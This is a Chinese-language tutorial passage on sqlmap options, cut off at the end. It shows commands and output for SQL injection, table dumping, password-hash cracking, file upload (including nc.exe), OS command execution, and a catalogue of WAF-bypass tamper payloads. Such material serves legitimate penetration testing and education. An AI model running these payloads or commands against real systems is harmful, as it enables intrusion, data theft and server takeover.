每次请求时候执行自定义的python代码--eval在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。 1python sqlmap.py -u "http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()" 上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。 Injection/注入测试参数-p sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot; 当你使用--level的值很大但是有个别参数不想测试的时候可以使用–skip参数。 例如：--skip=&quot;user-angent.referer&quot; 在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加* 123python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"sqlmap将会测试value1的位置是否可注入。 指定数据库--dbms 默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有： 1MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2 指定数据库服务器系统--os默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。 指定无效的大数字--invalid-bignum 当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。 指定无效的逻辑--invalid-logical可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。 注入payload--prefix,--suffix在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。 例如： 例如，代码中是这样调用数据库的： 1$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 这时你就需要--prefix和--suffix参数了： 这样执行的SQL语句变成： 1$query = "SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1"; 修改注入的数据--tamper sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用–tamper参数对数据做修改来绕过WAF等设备。 下面是一个tamper脚本的格式: 12345678910111213# Needed importsfrom lib.core.enums import PRIORITY# Define which is the order of application of tamper scripts against# the payload__priority__ = PRIORITY.NORMALdef tamper(payload): ''' Description of your tamper script ''' retVal = payload # your code to tamper the original payload # return the tampered payload return retVal 常用的tamper都在/tamper目录下： 1234567891011121314151617181920$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3[hh:mm:03] [DEBUG] cleaning up configuration parameters[hh:mm:03] [INFO] loading tamper script 'between'[hh:mm:03] [INFO] loading tamper script 'randomcase'[hh:mm:03] [INFO] loading tamper script 'space2comment'[...][hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041[...][hh:mm:04] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/group/**/bY/**/x)a)[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVINGclause' injectable[...] Detection/探测探测等级--level 共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。 这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。 总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。 风险等级--risk 共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。 测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。 页面比较--string,--not-string,--regexp,--code 默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。 --text-only,--titles 有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。 注入技术测试是否是注入--technique这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。所有支持的注入方式如下： 12345B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入） 设定延迟注入的时间--time-sec当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。 设定UNION查询字段数--union-cols默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当--level为5的时候他会增加测试到50个字段数。设定--union-cols的值应该是一段整数，如：12-16，是测试12-16个字段数。 设定UNION查询使用的字符--union-char默认情况下sqlmap针对UNION查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，这是你可以用--union-char只定UNION查询的字符。 二阶SQL注入--second-order 有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后面跟一个判断页面的URL地址。 枚举数据标志-b,--banner大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量@@version这主要取决与是什么数据库。 用户-current-user 在大多数据库中可以获取到管理数据的用户。 当前数据库--current-db 返还当前连接的数据库。 列数据库管理用户--users 当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。 列出并破解数据库用户的hash--passwords 当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。 12345678910111213141516171819$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1[...]back-end DBMS: PostgreSQL[hh:mm:38] [INFO] fetching database users password hashesdo you want to use dictionary attack on retrieved password hashes? [Y/n/q] y[hh:mm:42] [INFO] using hash method: 'postgres_passwd'what's the dictionary's location? [/software/sqlmap/txt/wordlist.txt][hh:mm:46] [INFO] loading dictionary from: '/software/sqlmap/txt/wordlist.txt'do you want to use common password suffixes? (slow!) [y/N] n[hh:mm:48] [INFO] starting dictionary attack (postgres_passwd)[hh:mm:49] [INFO] found: 'testpass' for user: 'testuser'[hh:mm:50] [INFO] found: 'testpass' for user: 'postgres'database management system users password hashes:[*] postgres [1]: password hash: md5d7d880f96044b72d0bba108ace96d1e4 clear-text password: testpass[*] testuser [1]: password hash: md599e5ea7a6f7c3269995cba3927fd0093 clear-text password: testpass 列出数据库管理员权限--privileges 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。 列举数据库表--tables,--exclude-sysdbs,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。 如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。 –exclude-sysdbs参数是指包含了所有的系统数据库。 需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。 列举数据库表中的字段--columns,-C,-T,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。 如果没有使用-D参数指定数据库时，默认会使用当前数据库。 123456789101112$ python sqlmap.py -u "http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1" --columns -D testdb -T users -C name[...]Database: SQLite_masterdbTable: users[3 columns]+---------+---------+| Column | Type |+---------+---------+| id | INTEGER || name | TEXT || surname | TEXT |+---------+---------+ 列举数据库系统的架构--schema,--exclude-sysdbs 用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。 加上--exclude-sysdbs参数，将不会获取数据库自带的系统库内容。 例如： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051$ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs[...]Database: owasp10Table: accounts[4 columns]+-------------+---------+| Column | Type |+-------------+---------+| cid | int(11) || mysignature | text || password | text || username | text |+-------------+---------+Database: owasp10Table: blogs_table[4 columns]+--------------+----------+| Column | Type |+--------------+----------+| date | datetime || blogger_name | text || cid | int(11) || comment | text |+--------------+----------+Database: owasp10Table: hitlog[6 columns]+----------+----------+| Column | Type |+----------+----------+| date | datetime || browser | text || cid | int(11) || hostname | text || ip | text || referer | text |+----------+----------+Database: testdbTable: users[3 columns]+---------+---------------+| Column | Type |+---------+---------------+| id | int(11) || name | varchar(500) || surname | varchar(1000) |+---------+---------------+[...] 获取表中数据个数--count 有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。 123456789$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb[...]Database: testdb+----------------+---------+| Table | Entries |+----------------+---------+| dbo.users | 4 || dbo.users_blob | 2 |+----------------+---------+ 获取整个表的数据--dump,-C,-T,-D,--start,--stop,--first,--last如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。 使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库。 12345678910111213$ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users[...]Database: Firebird_masterdbTable: USERS[4 entries]+----+--------+------------+| ID | NAME | SURNAME |+----+--------+------------+| 1 | luther | blisset || 2 | fluffy | bunny || 3 | wu | ming || 4 | NULL | nameisnull |+----+--------+------------+ 可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。 也可以用-dump跟-C获取指定的字段内容。 sqlmap为每个表生成了一个CSV文件。 如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop 1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。 也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。 运行自定义的SQL语句--sql-query,--sql-shell sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。 如果是SELECT查询语句，sqlap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。 12345678910111213141516171819202122$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1[...][hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''[hh:mm:14] [INFO] retrieved: fooSELECT 'foo': 'foo'$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo', 'bar'" -v 2[...][hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''[hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it intodistinct queries to be able to retrieve the output even if we are going blind[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS VARCHAR(8000)),(CHAR(32)))[hh:mm:50] [INFO] retrieved: foo[hh:mm:50] [DEBUG] performed 27 queries in 0 seconds[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VARCHAR(8000)),(CHAR(32)))[hh:mm:50] [INFO] retrieved: bar[hh:mm:50] [DEBUG] performed 27 queries in 0 secondsSELECT 'foo', 'bar': 'foo, bar' 暴力破解暴力破解表名--common-tables 当使用–tables无法获取到数据库的表时，可以使用此参数。原因一般是： 1231、MySQL数据库版本小于5.0，没有information_schema表。2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。3、当前用户没有权限读取系统中保存数据结构的表的权限。 暴力破解列名--common-columns 与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。 系统文件操作从数据库服务器中读取文件--file-read 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。 1234567891011121314151617181920$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \--file-read "C:/example.exe" -v 1[...][hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2000web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[hh:mm:50] [INFO] fetching file: 'C:/example.exe'[hh:mm:50] [INFO] the SQL query provided returns 3 entriesC:/example.exe file saved to: '/software/sqlmap/output/192.168.136.129/files/C__example.exe'[...]$ ls -l output/192.168.136.129/files/C__example.exe-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe$ file output/192.168.136.129/files/C__example.exeoutput/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI) Intel80386 32-bit 把文件上传到数据库服务器中--file-write,--file-dest 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。 123456789101112131415161718192021$ file /software/nc.exe.packed/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit$ ls -l /software/nc.exe.packed-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1[...][hh:mm:29] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or 2008web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: MySQL &amp;gt;= 5.0.0[...]do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been successfullywritten on the back-end DBMS file system? [Y/n] y[hh:mm:52] [INFO] retrieved: 31744[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes,same size as the local file '/software/nc.exe.packed' 运行任意操作系统命令--os-cmd,--os-shell 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。 在MySQL、PostgreSQL，sqlmap上传一个二进制库，包含用户自定义的函数，sys_exec()和sys_eval()`。 那么他创建的这两个函数可以执行系统命令。在Microsoft SQL Server，sqlmap将会使用xp_cmdshell存储过程，如果被禁（在Microsoft SQL Server 2005及以上版本默认禁制），sqlmap会重新启用它，如果不存在，会自动创建。 1234567891011121314151617181920212223$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \--os-cmd id -v 1[...]web application technology: PHP 5.2.6, Apache 2.2.9back-end DBMS: PostgreSQL[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system[hh:mm:12] [INFO] the back-end DBMS operating system is Linux[hh:mm:12] [INFO] testing if current user is DBA[hh:mm:12] [INFO] detecting back-end DBMS version from its banner[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF filedo you want to retrieve the command standard output? [Y/n/a] ycommand standard output: 'uid=104(postgres) gid=106(postgres) groups=106(postgres)'[hh:mm:19] [INFO] cleaning up the database management systemdo you want to remove UDF 'sys_eval'? [Y/n] ydo you want to remove UDF 'sys_exec'? [Y/n] y[hh:mm:23] [INFO] database management system cleanup finished[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system canonly be deleted manually 对Windows注册表操作当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持堆查询。 当然，当前连接数据库的用户也需要有权限操作注册表。 读取注册表值--reg-read 写入注册表值--reg-add 删除注册表值--reg-del 常规参数从sqlite中读取session-s sqlmap对每一个目标都会在output路径下自动生成一个SQLite文件，如果用户想指定读取的文件路径，就可以用这个参数。 保存HTTP(S)日志-t 这个参数需要跟一个文本文件，sqlmap会把HTTP(S)请求与响应的日志保存到那里。 非交互模式--batch 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。 强制使用字符编码--charset 不使用sqlmap自动识别的（如HTTP头中的Content-Type）字符编码，强制指定字符编码如： 1--charset=GBK 爬行网站URL--crawl sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。 123456789$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3[...][xx:xx:53] [INFO] starting crawler[xx:xx:53] [INFO] searching for links with depth 1[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while[xx:xx:53] [INFO] searching for links with depth 2[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'[xx:xx:00] [INFO] 42/56 links visited (75%)[...] 规定输出到CSV中的分隔符--csv-del 当dump保存为CSV格式时（--dump-format=CSV），需要一个分隔符默认是逗号，用户也可以改为别的 如： 1--csv-del=";" 其他参数使用HTTP参数污染-hpp HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效 测试WAF/IPS/IDS保护--identify-waf sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。 12345678910111213141516171819202122232425262728$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --identify-waf -v 3[...][xx:xx:23] [INFO] testing connection to the target URL[xx:xx:23] [INFO] heuristics detected web page charset 'ascii'[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (United Security Providers)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application Firewall (BinarySEC)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application Firewall (art of defence Inc.)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisco Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Firewall Enterprise (Teros/Citrix Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Akamai Technologies)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application Firewall (Incapsula/Imperva)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application Firewall (CloudFlare)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application Firewall (Barracuda Networks)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application Security (IBM)'[xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'[xx:xx:23] [DEBUG] page not found (404)[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Firewall (Jiasule)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firewall (AQTRONIX)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source Web Application Firewall (Trustwave)'[xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web Application Firewall (Trustwave)'. Please consider usage of tamper scripts (option '--tamper')[...] 自带tamper分析单引号替换 apostrophemask.py使用utf-8 编码 字符＇(U+FF07)替换单引号&#39;(U+0027) 1231' AND '1'='1 ==&gt;1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871 适用数据库：ALL 单引号替换 apostrophenullencode.py将单引号替换为%00%27 在引号前插入了空字符U+0000 1231' AND '1'='1==&gt;1�' AND �'1�'=�'1 适用数据库：ALL 添加空字符 appendnullbyte.py1return "%s%%00" % payload if payload else payload 适用数据库：Access base64编码 base64encode.py这个看模块名也知道是base64编码 1return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload 适用数据库：ALL 比较符替换 between.py将大于符号和等号用between语句替换，用于过滤了大于符号和等号的情况 1231 AND A &gt; B==&gt;1 AND A NOT BETWEEN 0 AND B 适用数据库：ALL 空格替换 bluecoat.py用%09 U+0009水平制表符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况 123SELECT id FROM users WHERE id = 1==&gt;SELECT%09id FROM%09users WHERE%09id LIKE 1 适用数据库：MySQL 5.1, SGOS 两次urlencode chardoubleencode.py123SELECT FIELD FROM%20TABLE==&gt;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545 适用数据库：ALL 一次url编码 charencode.py123SELECT FIELD FROM%20TABLE==&gt;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 unicode转义 charunicodeencode.py使用unicode转义所有字符，除了已经urlencode的字符 123SELECT FIELD%20FROM TABLE==&gt;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045 适用数据库：ALL，但是需要 asp 和 asp.net 环境 unicode转义 charunicodeescape.py常用语绕过WAF中JSON数据 123SELECT FIELD FROM TABLE==&gt;\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045 逗号替换 commalesslimit.py将的逗号用offset代替，用于过滤了逗号并且是两个参数的情况 123LIMIT 2, 3==&gt;LIMIT 3 OFFSET 2 适用数据库：MySQL mid函数逗号替换 commalessmid.py将mid函数中的start,end换成from to 123MID(VERSION(), 1, 1)==&gt;MID(VERSION() FROM 1 FOR 1 适用数据库：MySQL 括号前注释 commentbeforeparentheses.py在单词后括号前加行内注释以绕过WAF 123SELECT ABS(1)==&gt;SELECT ABS/**/(1) 适用数据库：ALL concat替换 concat2concatws.py用于过滤了concat函数的情况，将其转换为concat_ws函数 123CONCAT(1,2)==&gt;CONCAT_WS(MID(CHAR(0),0,0),1,2 适用数据库：MySQL 等号替换成like equaltolike.py123SELECT * FROM users WHERE id=1==&gt;SELECT * FROM users WHERE id LIKE 1 引号转义逃逸 escapequotes.py&#39;单引号变成\\&#39;,&quot;双引号变成\\&quot; 大于号替换 greatest.py1231 AND A &gt; B==&gt;1 AND GREATEST(A,B+1)=A 在关键词前加内联注释 halfversionedmorekeywords.py123value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa==&gt;value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa 适用数据库：MySQL &lt; 5.1 ,之后的内联注释必须为/*!content*/ html实体转义 htmlencode.py1231' AND SLEEP(5)#==&gt;1&amp;#39;&amp;#32;AND&amp;#32;SLEEP&amp;#40;5&amp;#41;&amp;#35; ifnull函数替换 ifnull2casewhenisnull.py将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况123IFNULL(1, 2)==&gt;CASE WHEN ISNULL(1) THEN (2) ELSE (1) END ifnull函数替换 ifnull2ifisnull.py将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况 123IFNULL(1, 2)==&gt;IF(ISNULL(1),2,1) 适用数据库：MySql5.0,5.5 内置表过滤绕过 informationschemacomment.py有些WAF过滤了information_schema字段，在其后面加行内注释 123SELECT table_name FROM INFORMATION_SCHEMA.TABLES==&gt;SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES 使用least替换比较符 least.py1231 AND A &gt; B==&gt;1 AND LEAST(A,B+1)=B+1 大写转小写 lowercase.py123INSERT==&gt;insert 完整语句注释绕过 modsecurityversioned.py使用内联注释注释完整语句，绕过ModSecurity WAF/IDS 1231 AND 2&gt;1--==&gt;1 /*!30874AND 2&gt;1*/-- 完整语句注释绕过 modsecurityzeroversioned.py同上，补了4个0 1231 AND 2&gt;1--==&gt;1 /*!00000AND 2&gt;1*/-- 关键字周围加空格 multiplespaces.py1231 UNION SELECT foobar==&gt;1 UNION SELECT foobar 叠写关键字 nonrecursivereplacement.py用于绕过替换策略，例如服务器做如下操作replace(&quot;SELECT&quot;, &quot;&quot;)，可用此方式绕过： 1231 UNION SELECT 2--==&gt;1 UNIOUNIONN SELESELECTCT 2-- overlongutf8.py123SELECT FIELD FROM TABLE WHERE 2&gt;1==&gt;SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1 用百分号加到所有字符前面 percentage.py123SELECT FIELD FROM TABLE==&gt;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 加号替换为concat plus2concat.py123SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL==&gt;SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL 加号替换为fn concat plus2fnconcat.py123SELECT (CHAR(113)+CHAR(114)+CHAR(115)) FROM DUAL==&gt;SELECT &#123;fn CONCAT(&#123;fn CONCAT(CHAR(113),CHAR(114))&#125;,CHAR(115))&#125; FROM DUAL 随机大小写 randomcase.py123INSERT==&gt;INseRt 随机加注释 randomcomments.py123INSERT==&gt;I/**/N/**/SERT 加入任意字符串 securesphere.py1231 AND 1=1==&gt;1 AND 1=1 and '0having'='0having' 添加sp_password字段 sp_password.py在payload语句后添加sp_password，用于迷惑数据库日志1231 AND 9227=9227--==&gt;1 AND 9227=9227-- sp_password 适用数据库：MSSQL 空格替换 space2comment.py123SELECT id FROM users==&gt;SELECT/**/id/**/FROM/**/users 空格替换 space2dash.py空格替换成被注释的字符串并换行 1231 AND 9227=9227==&gt;1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227 适用数据库：MSSQL、 SQLite 空格替换 space2hash.py同上，注释从--改为# 1231 AND 9227=9227==&gt;1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227 空格替换 space2morecomment.py将空格用 /**_**/ 替代 123SELECT id FROM users==&gt;SELECT/**_**/id/**_**/FROM/**_**/users 空格替换 space2morehash.py跟之前的差不多，用#+随机字串+\n代替空格 1231 AND 9227=922==&gt;1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227 空格替换 space2mssqlblank.py随即用空白ASCII替换空格 12345678910111213141516171819 # ASCII table: # SOH 01 start of heading # STX 02 start of text # ETX 03 end of text # EOT 04 end of transmission # ENQ 05 enquiry # ACK 06 acknowledge # BEL 07 bell # BS 08 backspace # TAB 09 horizontal tab # LF 0A new line # VT 0B vertical TAB # FF 0C new page # CR 0D carriage return # SO 0E shift out # SI 0F shift inblanks = ('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')random.choice(blanks) 空格替换 space2plus.py空格替换为+ 123SELECT id FROM users==&gt;SELECT+id+FROM+users 适用数据库：ALL 空格替换 space2randomblank.py空格替换为随机空白符 123456789 # ASCII table: # TAB 09 horizontal TAB # LF 0A new line # FF 0C new page # CR 0D carriage returnblanks = ("%09", "%0A", "%0C", "%0D")SELECT id FROM users==&gt;SELECT%0Did%0DFROM%0Ausers 适用数据库：ALL 逻辑操作符替换 symboliclogical.pyand和or替换成&amp;&amp; || 1231 AND '1'='1==&gt;1 %26%26 '1'='1 union替换 unionalltounion.py123-1 UNION ALL SELECT==&gt;-1 UNION SELECT 宽字符注入 unmagicquotes.py&#39;替换为%df%27 1231' AND 